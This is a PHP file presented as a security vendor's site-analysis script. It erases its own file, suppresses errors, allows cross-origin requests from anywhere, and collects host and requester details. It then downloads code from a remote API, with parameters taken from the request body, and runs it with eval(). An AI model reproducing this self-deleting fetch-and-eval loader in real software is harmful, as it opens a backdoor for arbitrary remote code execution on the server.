<?php
/**================================================================================================
	___  ___
	|  \/  | Copyright (C) 2017-2022, Monarx, Inc.
	| .  . |  ___   _ __    __ _  _ __ __  __
	| |\/| | / _ \ | '_ \  / _` || '__|\ \/ /
	| |  | || (_) || | | || (_| || |    >  <
	\_|  |_/ \___/ |_| |_| \__,_||_|   /_/\_\

===================================================================================================
@package    Monarx Security Site Analyzer
@file		monarx-analyzer.php
@copyright	Private Monarx, Inc. Not for external use, redistribution, or sale.
@site       https://www.monarx.com
===================================================================================================
This scripts provides Monarx with site analysis data, which is utilized to identify and remediate malicious activity.
--------------------------------------------------------------------------------------------------*/
error_reporting(0);

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header("Access-Control-Allow-Headers: *");

@unlink("monarx-analyzer.php");

ignore_user_abort(true);
ini_set('max_execution_time', 900);

class MonarxSecuritySiteAnalyzer
{
    private $version = '1.0.0';
    private $task_context;
    private $agent_id;
    private $instructions;
    private $req_body;

    public function __construct()
    {
        $req_body = json_decode(file_get_contents("php://input") , true);
        $request_id = isset($req_body["verify"]) ? $req_body["verify"] : 1;
        $tool_name = isset($req_body["name"]) ? $req_body["name"] : "collector";

        $this->req_body = $req_body;
        $this->agent_id = @file_get_contents('/var/cache/monarx-agent/.monarxai');

        $this->task_context = array(
            "name" => "collect",
            "agent_id" => $this->agent_id,
            "hostname" => @gethostname() ,
            "home_dir" => getcwd() ,
            "requestor" => array(
                "user_agent" => $_SERVER['HTTP_USER_AGENT'],
                "remote_ip" => $_SERVER['REMOTE_ADDR'],
                "server_name" => $_SERVER['SERVER_NAME'],
                'script_name' => $_SERVER['SCRIPT_NAME'],
                'request_uri' => $_SERVER['REQUEST_URI'],
            ) ,
        );

        $instructions = $this->httpGet('https://api.monarx.com/v1/intelligence/tools/download?name=' . $tool_name .'&verify=' . $request_id);
        $this->instructions = $instructions;
    }

    private function httpGet($url)
    {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLINFO_HEADER_OUT, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Monarx Security Site Analysis v' . $this->version);

        $result = curl_exec($ch);
        curl_close($ch);

        return $result;
    }

    public function run()
    {
        if (isset($this->instructions) && strlen($this->instructions))
        {
            eval($this->instructions);

            return true;
        }

        return false;
    }
}

try
{
    $mnx = new MonarxSecuritySiteAnalyzer();
    $success = $mnx->run();
}
catch(Exception $e)
{
    //
}

